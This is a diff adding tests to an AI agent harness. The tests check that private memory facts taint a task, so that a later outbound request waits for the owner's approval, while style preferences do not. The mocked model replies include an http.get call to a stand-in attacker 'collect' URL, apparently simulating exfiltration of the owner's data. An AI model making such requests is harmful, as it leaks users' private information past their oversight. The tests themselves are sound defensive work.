@@ -240,3 +240,45 @@ describe("saving a memory is the owner's decision", () => {
     void json;
   });
 });
+
+describe("what is remembered is private: it taints a task like a file that was read", () => {
+  const getUrl = toolReply("http.get", { url: "https://attacker.example.invalid/collect" });
+
+  it("after memory.search, a request that leaves the machine waits for the owner", async () => {
+    const t = tempDir();
+    const memoryFile = join(t.dir, "memory.json");
+    new MemoryService(memoryFile).add("My sister Mina lives in Busan", "fact", owner);
+    const m = new MockProvider("m", [planReply(["look"], []), toolReply("memory.search", { query: "Mina" }), getUrl, finishReply("done")]);
+    const h = harness({ providers: [m], memoryFile });
+    const task = await h.engine.submit({ goal: "plan a trip" });
+    await h.engine.runTask(task.id);
+    assert.equal((await h.store.getTask(task.id))!.status, "WAITING_FOR_APPROVAL");
+    assert.match((await h.store.listApprovals("pending"))[0]!.summary, /attacker\.example/);
+    h.cleanup();
+    t.cleanup();
+  });
+
+  it("a fact about the owner that was put in the prompt taints the task from its first step; a preference about style does not", async () => {
+    const t = tempDir();
+    const memoryFile = join(t.dir, "memory.json");
+    new MemoryService(memoryFile).add("My sister Mina lives in Busan", "fact", owner);
+    const withFact = new MockProvider("m", [planReply(["send"], []), getUrl, finishReply("done")]);
+    const h = harness({ providers: [withFact], memoryFile });
+    const task = await h.engine.submit({ goal: "write to my sister Mina" });
+    await h.engine.runTask(task.id);
+    assert.equal((await h.store.getTask(task.id))!.status, "WAITING_FOR_APPROVAL", "the fact is in the prompt, so a request out is asked about");
+    h.cleanup();
+
+    const t2 = tempDir();
+    const memoryFile2 = join(t2.dir, "memory.json");
+    new MemoryService(memoryFile2).add("Keep answers to three lines", "preference", owner);
+    const withPref = new MockProvider("m", [planReply(["send"], []), getUrl, finishReply("done")]);
+    const h2 = harness({ providers: [withPref], memoryFile: memoryFile2 });
+    const task2 = await h2.engine.submit({ goal: "write to my sister Mina" });
+    await h2.engine.runTask(task2.id);
+    assert.notEqual((await h2.store.getTask(task2.id))!.status, "WAITING_FOR_APPROVAL", "style preferences are not private");
+    h2.cleanup();
+    t.cleanup();
+    t2.cleanup();
+  });
+});
